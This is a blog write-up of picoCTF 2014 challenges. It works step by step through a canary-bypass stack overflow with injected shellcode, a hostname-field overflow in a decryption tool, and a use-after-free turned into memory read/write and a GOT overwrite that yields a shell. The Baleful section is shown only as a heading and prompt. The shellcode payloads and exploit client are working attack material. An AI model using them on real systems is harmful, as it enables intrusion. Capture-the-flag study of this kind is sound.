---
layout: post
title: picoctf 2014 writeup
category: blog
tags: ctf writeup reverse exploit
---

Contents
========
{:.no_toc}

* toc
{:toc}

*[picoCTF](https://picoctf.com/) is a computer security game targeted at middle and high school students.* Never mind, I'm not a high school student, but I still did this ctf with my friends just for fun. Most of the challenges were straightforward except the last level ones. This ctf was designed for learning so that there was a hint for each challenge. I did four of them, three binary exploit (*Nevernote*, *CrudeCrypt*, *Fancy Cache*) and one reverse engineering (*Baleful*).

Nevernote
=========
*In light of the recent attacks on their machines, Daedalus Corp has implemented a buffer overflow detection library. Nevernote, a program made for Daedalus Corps employees to take notes, uses this library. Can you bypass their protection and read the secret?*

Let's check the custom buffer overflow detection library.
{% highlight c linenos %}
pico57275@shell:/home/nevernote$ ls
canary.c  canary.h  core  flag.txt  Makefile  nevernote  nevernote.c  notes

cat canary.h
#define SAFE_BUFFER_SIZE 512

struct canary{
    int canary;
    int *verify;
};

/* buffer overflow resistant buffer */
struct safe_buffer{
    char buf[SAFE_BUFFER_SIZE];
    struct canary can;
};
...

cat canary.c
...
void get_canary(struct canary *c){
    // store the canary on the heap for verification!
    int *location = (int *)malloc(sizeof(int));

    // use good randomness!
    FILE *f = fopen("/dev/urandom", "r");
    fread(location, sizeof(int), 1, f);
    fclose(f);

    c->verify = location;
    c->canary = *location;
    return;
}

void verify_canary(struct canary *c){
    if (c->canary != *(c->verify)){
        printf("Canary was incorrect!\n");
        __canary_failure(1);
    }

    // we're all good; free the canary and return
    free(c->verify);
    return;
}
...
{% endhighlight %}

The *safe_buffer* struct (line 12 to 16) contained a string of size 512 and a *canary* struct (line 7 to 10). While creating a safe_buffer struct, its canary  was initialized by reading from */dev/urandom*. Nothing to say here, since the canary's value would be really random. Let's check the main function to see where would be the buffer overflow (this was a binary exploit challenge and it had a buffer overflow protection, so there would a buffer overflow some where).

{% highlight c linenos %}
cat nevernote.c
...
#define NOTE_SIZE 1024

bool get_note(char *dest){
    struct safe_buffer temporary;
    bool valid;

    get_canary(&temporary.can);

    printf("Write your note: ");
    fflush(stdout);
    fgets(temporary.buf, NOTE_SIZE, stdin);

    // disallow some characters
    if (strchr(temporary.buf, '\t') || strchr(temporary.buf, '\r')){
        valid = false;
    }else{
        valid = true;
        strncpy(dest, temporary.buf, NOTE_SIZE);
    }

    verify_canary(&temporary.can);

    return valid;
}
...
{% endhighlight %}

*nevernote.c* defined a buffer of size 1024 (line 3) that was much bigger than the safe_buffer's size (512). Thus the buffer overflow was in line 13. The follwing code confirmed this buffer oveflow. However, the protection mechanism could detect it. Because I've overwritten the canary's value and pointer to 0x61616161 (*aaaa*) and 0x61616161 respectively. The check would not pass since 0x61616161 != *(0x61616161).

{% highlight bash %}
pico57275@shell:/home/nevernote$ python -c 'print "someone\n" + "add\n" + "a"*600'|./nevernote 
Please enter your name: Enter a command: Write your note: Buffer overflow detected! Exiting.
{% endhighlight %}

So we controlled both canary's value and its pointer. In order to make this condition checked, I first thought about replacing the pointer by a pointer to our stack. Looked this segmentation fault at GDB, located our stack and picked a pointer in the middle of our stack, here *0xffffd4d0* for instance.  (Credit: [Feed binary stdin from inside gdb](http://dustri.org/b/feed-binary-stdin-from-inside-gdb.html))

{% highlight asm %}
gdb -q ./nevernote
(gdb) r <<< $(python -c 'print "someone\n" + "add\n" + "a"*600')
Starting program: /home/nevernote/nevernote <<< $(python -c 'print "someone\n" + "add\n" + "a"*600')
Please enter your name: Enter a command: Write your note: 
Program received signal SIGSEGV, Segmentation fault.
0x0804881b in verify_canary ()
(gdb) i r
eax            0x61616161       1633771873
ecx            0x804c490        134530192
edx            0x61616161       1633771873
...

(gdb) x/100xw $esp
...
0xffffd4c0:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffd4d0:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffd4e0:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffd4f0:     0x61616161      0x61616161      0x61616161      0x61616161
...
(gdb) 
{% endhighlight %}

Great, I had now a pointer to 0x61616161, but where should I put it? I needed to determine the offset of canary's pointer. I used metsploit's tool to create a pattern and get the offset.
{% highlight asm %}
$/usr/share/metasploit/tools/pattern_create.rb 600
...
(gdb) r <<< $(python -c 'print "someone\n" + "add\n" + "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9" ')
...
Please enter your name: Enter a command: Write your note: 
Program received signal SIGSEGV, Segmentation fault.
0x0804881b in verify_canary ()
=> 0x0804881b <verify_canary+17>:       8b 00   mov    (%eax),%eax
(gdb) print/x $eax
$1 = 0x41347441
(gdb) q

$/usr/share/metasploit/tools/pattern_offset.rb 0x41347441 
[*] Exact match at offset 582
{% endhighlight %}

Let's try this solution.
{% highlight bash %}
pico57275@shell:/home/nevernote$ ./nevernote <<< $(python -c 'print "someone\n" + "add\n" + "a"*582 + "\xd0\xd4\xff\xff"')
Please enter your name: Enter a command: Write your note: *** Error in './nevernote': free(): invalid pointer: 0xffffd4d0 ***
Aborted (core dumped)
{% endhighlight %}

Euh, the stack pointer that I used did not pass the *free* function. Thus, I needed to find other thing that was indeed a malloced memory area.

{% highlight c %}
$cat nevernote.c
...
note_file_path = (char *)malloc(strlen(name)+64);
sprintf(note_file_path, "/home/nevernote/notes/%s", name);
...
{% endhighlight %}
Actually, the program wrote notes to a file with the given name. The above code showed that there was a malloc that contained the path prefix each time we added a note. This means that the first bytes pointed by this pointer would always be the same. What's more, there was no ASLR on that machine so that the mallco address would not change. I could thus use this pointer and its value to replace the canary's value and pointer. Just needed to retrieve these values in GDB. I've added two breakpoints, one at *malloc* and the other at after *sprintf*.

{% highlight asm %}
Breakpoint 2, 0x08048b2e in command_loop ()
(gdb) ni
(gdb) x/xw $eax
0x804c008:      0x00000000
(gdb) c
...
Breakpoint 3, 0x08048b50 in command_loop ()
(gdb) x/xw 0x0804c008
0x804c008:      0x6d6f682f
{% endhighlight %}

Try again the new solution. Note that I've added some junk after the canary pointer in order not to break the inner stack frame. The full call path was following: command_loop() -> add_note() -> get_note() -> verify_canary(). When *get_note()* was called, the buffer overflow happened, then it called verify_canary() to check the buffer overflow. If not enough care was taken, the buffer overflow would break the stack frame of *verify_canary()*.

{% highlight asm %}
(gdb) r <<< $(python -c 'print "someone\n" + "add\n" + "a"*578 +"\x2f\x68\x6f\x6d" + "\x08\xc0\x04\x08" +"aaaa"+ "bbbb" + "\x58\xd6\xff\xff"*2 + "cccc" + "\xc0\x8a\xfc\xf7"*10')

Please enter your name: Enter a command: Write your note: 
ived signal SIGSEGV, Segmentation fault.
0x63636363 in ?? ()
=> 0x63636363:  Cannot access memory at address 0x63636363
{% endhighlight %}

So now I could control the *eip*. There was no ASLR and NX protection, I could put my shellcode on the stack (replace "a"\*578 by the shellcode) and set *eip* to it (replace cccc by the address of stack). I used a custom shellcode that did execve("/tmp/aaa", ["/tmp/aaa", NULL], NULL). Inside */tmp/aaa*, I've just done a *cat* on the flag file. To find out how to write a tiny shellcode, check this [repository](https://github.com/cregnec/tiny-shellcode).

{% highlight bash %}
pico57275@shell:/home/nevernote$ cat /tmp/aaa
#! /bin/sh
cat /home/nevernote/flag.txt

pico57275@shell:~$ /home/nevernote/nevernote <<< $(python -c 'print "someone\n" + "add\n" + "a"*52 + "\x90"*498 + "\x6a\x0b\x58\x99\x52\x68\x2f\x61\x61\x61\x68\x2f\x74\x6d\x70\x89\xe3\x52\x53\x89\xe1\xcd\x80\x6a\x01\x58\xcd\x80"  +"\x2f\x68\x6f\x6d" + "\x08\xc0\x04\x08" +"aaaa"+ "bbbb" + "\x58\xd6\xff\xff"*2 + "\xd0\xd4\xff\xff" + "\xc0\x8a\xfc\xf7"*10')
Please enter your name: Enter a command: Write your note: the_hairy_canary_fairy_is_still_very_wary
{% endhighlight %}

CrudeCrypt
==========
*Without proper maintainers, development of Truecrypt has stopped! CrudeCrypt has emerged as a notable alternative in the open source community. The author has promised it is 'secure' but we know better than that. Take a look at the code and read the contents of flag.txt*

Let's how crude would this program be! The following code was a part of the *main* function. 

{% highlight c linenos %}
int main(int argc, char **argv) {
    if(argc < 4) {
        help();
        return -1;
    }

    void (*action)(FILE*, FILE*, unsigned char*);

    if(strcmp(argv[1], "encrypt") == 0) {
        action = &encrypt_file;
        // You shouldn't be able to encrypt files you don't have permission to.
        setegid(getgid());
    } else if(strcmp(argv[1], "decrypt") == 0) {
        action = &decrypt_file;
    } else {
        printf("%s is not a valid action.\n", argv[1]);
        help();
        return -2;
    }
    ...
    printf("-> File password: ");
    fgets(file_password, PASSWORD_LEN, stdin);
    printf("\n");

    unsigned char digest[16];
    hash_password(digest, file_password);

    action(src_file, out_file, digest);
    ...
}
{% endhighlight %}

There were two options: *encrypt* and *decrypt*. Note that while encrypting, the effective group id was removed (line 12). This means that we could not encrypt a file that we did not have the access right. In the other hand, while decrypting, the effective group id was not removed. Then it asked a password (line 22) and the hash of this password would be used as encryption (or decryption) key (line 25 to 28). Next, let's check its encryption routine.



{% highlight c linenos %}
#define HOST_LEN 32
#define MULT_BLOCK_SIZE(size)                                   \
    (!((size) % 16) ? (size) : (size) + (16 - ((size) % 16)))

typedef struct {
    unsigned int magic_number;
    unsigned long file_size;
    char host[HOST_LEN];
} file_header;


void encrypt_file(FILE* raw_file, FILE* enc_file, unsigned char* key) {
    int size = file_size(raw_file);
    size_t block_size = MULT_BLOCK_SIZE(sizeof(file_header) + size);
    char* padded_block = calloc(1, block_size);

    file_header header;
    init_file_header(&header, size);
    safe_gethostname(header.host, HOST_LEN);

    memcpy(padded_block, &header, sizeof(file_header));
    fread(padded_block + sizeof(file_header), 1, size, raw_file);

    if(encrypt_buffer(padded_block, block_size, (char*)key, 16) != 0) {
        printf("There was an error encrypting the file!\n");
        return;
    }
    ...
}
{% endhighlight %}

The encryption route prepended a *file_header* struct to the original file (line 21, 22) and then encrypted them with the hash of the given password (line 24). *file_header* had three field: *magic*, *file_size* and *host* (line 5 to 9). *magic* had a fixed value and was used after decryption to verify if the password was correct. *host* stored the machine's hostname that was used for encryption (line 19). This field had a fixed size of 32 (line 1). Until now, nothing special to say, I continued to look at the decryption routine.


{% highlight c linenos %}
void decrypt_file(FILE* enc_file, FILE* raw_file, unsigned char* key) {
    int size = file_size(enc_file);
    char* enc_buf = calloc(1, size);
    fread(enc_buf, 1, size, enc_file);

    if(decrypt_buffer(enc_buf, size, (char*)key, 16) != 0) {
        printf("There was an error decrypting the file!\n");
        return;
    }

    char* raw_buf = enc_buf;
    file_header* header = (file_header*) raw_buf;

    if(header->magic_number != MAGIC) {
        printf("Invalid password!\n");
        return;
    }

    if(!check_hostname(header)) {
        printf("[#] Warning: File not encrypted by current machine.\n");
    }
    ...
}

bool check_hostname(file_header* header) {
    char saved_host[HOST_LEN], current_host[HOST_LEN];
    strncpy(saved_host, header->host, strlen(header->host));
    safe_gethostname(current_host, HOST_LEN);
    return strcmp(saved_host, current_host) == 0;
}
{% endhighlight %}

The decryption routine first check if the password was correct (line 13 to 17). Then it called *check_hostname(header)* to check the hostname (line 19 to 21). In this function, it copied the decrypted hostname to a local variable *saved_host* (line 27). Here it supposed that the decrypted hostname's size would not be bigger than *HOST_LEN* that was 32. There was no check on the size of the decrypted hostname. Therefore, if we crafted a encrypted file with a hostname whose size was much bigger than 32, we could generate a buffer overflow!
In order to do this, I copied the c source and Makefile to the */tmp/* directory. I changed the *safe_gethostname* function so that I could have a evil hostname. I've set the hostname's length to 128.

{% highlight c linenos %}
$cat crude_crypt.c
...
#define HOST_LEN 128
...

void safe_gethostname(char *name, size_t len) {
    /*gethostname(name, len);*/
    int i = 0;
    for (i=0; i<len; i++){
        name[i] = 0x66;
    }
    name[len-1] = '\0';
}
...

$make
$./crude_crypt encrypt Makefile evil
-=- Welcome to CrudeCrypt 0.1 Beta -=-
-> File password: a

=> Encrypted file successfully
$gdb -q --args /home/crudecrypt/crude_crypt decrypt evil output
(gdb) r
Starting program: /home/crudecrypt/crude_crypt decrypt evil output
-=- Welcome to CrudeCrypt 0.1 Beta -=-
-> File password: a

Program received signal SIGSEGV, Segmentation fault.
0x66666666 in ?? ()
(gdb) q
{% endhighlight %}

Well, the *eip* was overwritten to 0x66666666 that we controlled. There was neither ASLR nor NX protection. Therefore, we can use the same technique as the previous challenge *nevernote*. I will omit the following steps :p. The lesson learned: never trust user inputs !

Fancy Cache
============
*Margaret wrote a fancy in-memory cache server. For extra security, she made a custom string structure that keeps strings on the heap. However, it looks like she was a little sloppy with her mallocs and frees. Can you find and exploit a bug to get a shell?*

The server of this challenge had ASLR and NX protection. We had the source code, binary, libc and a python client for communication with the server. The first hint was that there was an use after free (UAF) in this program. I first looked at the main function.

{% highlight c linenos %}
while (1) {                                                                                                                           
    if (read(STDIN_FILENO, &command, 1) != 1) {                                                                                         
      exit(1);                                                                                                                          
    }                                                                                                                                   
                                                                                                                                        
    switch (command) {                                                                                                                  
      case CACHE_GET:                                                                                                                   
        do_cache_get();                                                                                                                 
        break;                                                                                                                          
      case CACHE_SET:                                                                                                                   
        do_cache_set();                                                                                                                 
        break;                                                                                                                          
      default:                                                                                                                          
        // Invalid command.                                                                                                             
        return 1;                                                                                                                       
        break;                                                                                                                          
    }                                                                                                                                   
}         
{% endhighlight %}

There was a main loop that would either call *do_cache_get()* (line 8) or *do_cache_set()* (line 11) upon the user input. Let's look at the cache structure.

{% highlight c linenos %}
struct string {                                                                                                                         
  size_t length;                                                                                                                        
  size_t capacity;                                                                                                                      
  char *data;                                                                                                                           
};                                                                                                                                      
                                                                                                                                        
struct cache_entry {                                                                                                                    
  struct string *key;                                                                                                                   
  struct string *value;                                                                                                                 
  // The cache entry expires after it has been looked up this many times.                                                               
  int lifetime;                                                                                                                         
};
...
// The goal of this challenge is to get a shell. Since this machine has                                                                 
// ASLR enabled, a good first step is to get the ability to read memory                                                                 
// from the server. Once you have that working, read this string for a                                                                  
// (flag|hint next steps).                                                                                                              
const char *kSecretString = ...
...
// Initializes a struct string to an empty string.                                                                                      
void string_init(struct string *str) {                                                                                                  
  str->length = 0;                                                                                                                      
  str->capacity = 0;                                                                                                                    
  str->data = NULL;                                                                                                                     
} 
...
{% endhighlight %}

Each cache had three field: *key*, *value*, *lifetime*. Both *key* and *value* were variables of *string* struct. The *string* struct had also three fields: *length*, *capacity* and *data*. When a new *string* variable was created, the *data* field would be allocated with sufficient memory. Here came the second hint. Organisers have left a second hint in this program. Actually they were saying that I needed a information leak that was indispensable to bypass ASLR. Now let's take a look at the *do_cache_get()* function.


{% highlight c linenos %}
struct cache_entry *cache_lookup(struct string *key) {
  size_t i;
  for (i = 0; i < kCacheSize; ++i) {
    struct cache_entry *entry = &cache[i];

    // Skip expired cache entries.
    if (entry->lifetime == 0) {
      continue;
    }

    if (string_eq(entry->key, key)) {
      return entry;
    }
  }

  return NULL;
}

void do_cache_get(void) {
  struct string key;
  string_init(&key);
  read_into_string(&key);

  struct cache_entry *entry = cache_lookup(&key);
  if (entry == NULL) {
    write(STDOUT_FILENO, &kNotFound, sizeof(kNotFound));
    return;
  }                                                                                                                                     

  write(STDOUT_FILENO, &kFound, sizeof(kFound));
  write_string(entry->value);

  --entry->lifetime;
  if (entry->lifetime <= 0) {
    // The cache entry is now expired.
    fprintf(stderr, "Destroying key\n");
    string_destroy(entry->key);
    fprintf(stderr, "Destroying value\n");
    string_destroy(entry->value);
  }
}
{% endhighlight %}

*do_cache_get()* first created a *key* and asked user to input a key string (line 20 to 22). Then it called *cache_lookup()* function to search if the cache was in memory (line 24). If yes, it would return the cache's value (line 31) and decrement the lifetime of this cache (line 33). Finally it checked whether the lifetime was negative. If yes, it would free both the *key* and *value* (they were both variables of *string* struct) (line 34 to 40). The definition of the *cache_lookup()* function is interesting and bugged (line 1 to 17). It would go over all in memory cache and do a strcmp on all caches whose lifetime was not zero (line 7). This means that if the lifetime of a cache was negative, the *cache_lookup()* function still considered this cache valid. However, in *do_cache_get()* function, when a cache's lifetime became negative, this cache would be freed. So here it is, the *use after free*. And in the *do_cache_set()* function, there was no check on the *lifetime* value so that I could create a cache with a negative lifetime. POC time !

{% highlight python linenos %}
$cat client.py
...
def read_mem(target, size):
    # Add an entry to the cache
    assert cache_set(f, '/bin/sh\x00\x00\x00\x00\x00', pack4(size)+pack4(size)+pack4(target), 0xffffffff)
    # Retrieve it back
    assert cache_get(f, '/bin/sh\x00\x00\x00\x00\x00')

    assert not cache_get(f, pack4(size)+pack4(size)+pack4(target))
    assert not cache_get(f, '\x0c')
    return cache_get(f, '/bin/sh\x00\x00\x00\x00\x00')
{% endhighlight %}

First, I created a cache with a *lifetime* -1 (line 5). Then I got back this cache so that it would be freed (line 7). At last, I added two *cache_get()* (line 9, 10) to modify the cache's key and value (see explication below) and read back the target memory's value (line 11). The following result was the server side debug information.

{% highlight bash linenos %}
$mkfifo /tmp/pipe
$cat /tmp/pipe | ./fancy_cache| nc -l 1337 > /tmp/pipe
Cache server starting up (secret = [REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED])
malloc(12) = 0x8ddf008 (string_create)
realloc((nil), 12) = 0x8ddf018 (read_into_string)
malloc(12) = 0x8ddf028 (string_create)
realloc((nil), 12) = 0x8ddf038 (read_into_string)
realloc((nil), 12) = 0x8ddf048 (read_into_string)
Destroying key
free(0x8ddf008) (string_destroy str)
Destroying value
free(0x8ddf028) (string_destroy str)
realloc((nil), 12) = 0x8ddf028 (read_into_string)
realloc((nil), 1) = 0x8ddf008 (read_into_string)
realloc((nil), 12) = 0x890c058 (read_into_string)
Destroying key
free(0x890c008) (string_destroy str)
Destroying value
free(0x890c028) (string_destroy str)
{% endhighlight %}

Since the program did not create socket, I used *netcat* to execute it and listen on port 1337 (line 1, 2). Line 4 and 6 were the memory allocation for the cache's key and value. After the retrieve of the cache, the key and value were freed (line 9 to 12). The reallocation in line 13 and 14 was the memory used to store the next *cache_get's* key string. At the same time, the two memory area were used by the cache (because it's lifetime was not zero). This means that we control the key and value of the cache. Indeed, the first reallocation (line 13) rewrote the cache's value and the second one (line 14) rewrote the cache's key value. Actually, I've replaced the *data* field of the cache's value by the pointer that I wanted to read. For the cache's key, I've justed rewritten the length of the original key ('/bin/sh\x00\x00\x00\x00\x00'), that was 0xc because the key string in memory was not freed. In the end, the last *cache_get* (realloccation in line 15) read the target memory.

{% highlight python linenos %}
$readelf -s fancy_cache | grep kSe
    64: 0804b044     4 OBJECT  GLOBAL DEFAULT   24 kSecretString

$cat clien.py
...
my_len = 4
my_target = 0x0804b044
stringAddr = unpack4(read_mem(my_target, my_len))
print("secret string address is 0x%08x"%stringAddr)

my_len = 140
my_target = stringAddr
print(read_mem(my_target, my_len))

$python2 client.py

secret string address is 0x08048bc8
Congratulations! Looks like you figured out how to read memory. This can can be a useful tool for defeating ASLR :-) Head over to https://picoctf.com/problem-static/binary/fancy_cache/next_steps.html for some hints on how to go from what you have to a shell!
{% endhighlight %}

I retrieved the *keSecretString* variable address (line 1, 2) because I wanted to get back this secret information. Then I readed the pointer address to this secret string (line 6 to 9) and the secret string (line 11 to 13). And here came the third hint. It explained the ret-to-libc technique (check above link for more information). At this step, I could read arbitary memory. In order to use this technique, I would need to be able to write to arbitary memory. To do this, I used the same bug and replace the last *cache_get* by *cache_set*.

{% highlight python linenos %}
def write_mem(target, value):
    size = 4
    # Add an entry to the cache
    assert cache_set(f, '/bin/sh\x00\x00\x00\x00\x00', pack4(size)+pack4(size)+pack4(target), 0xffffffff)
    # Retrieve it back
    assert cache_get(f, '/bin/sh\x00\x00\x00\x00\x00')

    assert not cache_get(f, pack4(size)+pack4(size)+pack4(target))
    assert not cache_get(f, '\x0c')
    assert cache_set(f, '/bin/sh\x00\x00\x00\x00\x00', pack4(value), 1)
{% endhighlight %}

Like explained in the hint link, I choosed to replace the GOT of *memcmp* by the GOT of *system*. Because *memcmp* had two string arguments that I could easily pass the argument of *system* ("/bin/sh") to it. Now, I could read the memory at anywhere so it was easy to get the GOT value of *memcmp*. I still needed to calculate the offset from *memcmp* to *system*.

{% highlight c linenos %}
$cat get_offset.c
#include <stdlib.h>
#include <stdio.h> 
#include <string.h>
                                                                                                                                        
int main(){
        char *a = "123";
        char *b = "123";
        int ret = 0;
        int *memcmp_ptr, *system_ptr;

        ret = memcmp(a, b, sizeof(a));
        /* compile the program, repalce this value and recompile it.*/
        memcmp_ptr = (int *)0x804a010;
        printf("memcmp addr is 0x%08x\n", *memcmp_ptr);

        ret = system("foo");
        /* compile the program, repalce this value and recompile it.*/
        system_ptr = (int *)0x804a014;
        printf("system addr is 0x%08x\n", *system_ptr);
        printf("the offset from memcmp to system is -0x%08x\n", *memcmp_ptr-*system_ptr);

        return 0;
}

$gcc -m32 get_offset.c -o get_offset
$readelf -r get_offset
...
0804a010  00000207 R_386_JUMP_SLOT   00000000   memcmp
0804a014  00000307 R_386_JUMP_SLOT   00000000   system
...

$gcc -m32 get_offset.c -o get_offset
$./get_offset
memcmp addr is 0xf7f5e870
sh: 1: foo: not found
system addr is 0xf7e5c100
the offset from memcmp to system is -0x102770
{% endhighlight %}

I've written a small program to retrieve the offset from *memcmp* to *system*, that I've copied to the ctf server. First compiled this code and got back their pointer to GOT. Then put these value in the program and re-compiled it. Finally executed it and the offset was -0x102770. In the next, I would read *memcmp*'s GOT value, overwrite it by the value of *system* and trigger it to get a shell. 

{% highlight python linenos %}
$readelf -r fancy_cache | grep memcmp 
0804b014  00000307 R_386_JUMP_SLOT   00000000   memcmp
$cat clien.py
...
def shell_get(f, key, s):
    f.write(chr(CACHE_GET))
    write_string(f, key)
    
    t = telnetlib.Telnet()
    t.sock = s
    print("Got a shell!")
    t.interact()

my_len = 4
my_target = 0x0804b014
memcmpAddr = unpack4(read_mem(my_target, my_len))
print("mmap address is 0x%08x"%memcmpAddr)
systemAddr = memcmpAddr - 0x00102770
write_mem(my_target, systemAddr)
shell_get(f, '/bin/sh\x00\x00\x00\x00\x00', s)

$python2 client.py 

mmap address is 0xf76b4870
Got a shell!
id
uid=1009(fancy_cache) gid=1009(fancy_cache) groups=1009(fancy_cache)
pwd
/
ls /home
bleichenbacher
easyoverflow
ecb
fancy_cache
guess
hardcore_owner
lowentropy
netsino
policerecords
ubuntu
ls /home/fancy_cache
fancy_cache
fancy_cache.sh
flag.txt
cat /home/fancy_cache/flag.txt
that_wasnt_so_free_after_all
{% endhighlight %}

So the final exploit: first read the *memcmp's* address (line 16), the used the previously calculated offset to get the address of *system* (line 18), replaced *memcmp's* address by the address of *system* and called *cache_get* to trigger *system* so that I could have a shell. Indeed, *system* used the cache's key as its argument (here '/bin/sh\x00\x00\x00\x00\x00'). It remained only to find the flag and read it.

Baleful
=======
*This program seems to be rather delightfully twisted! Can you get it to accept a password? We need it to get access to some Daedalus Corp files.*
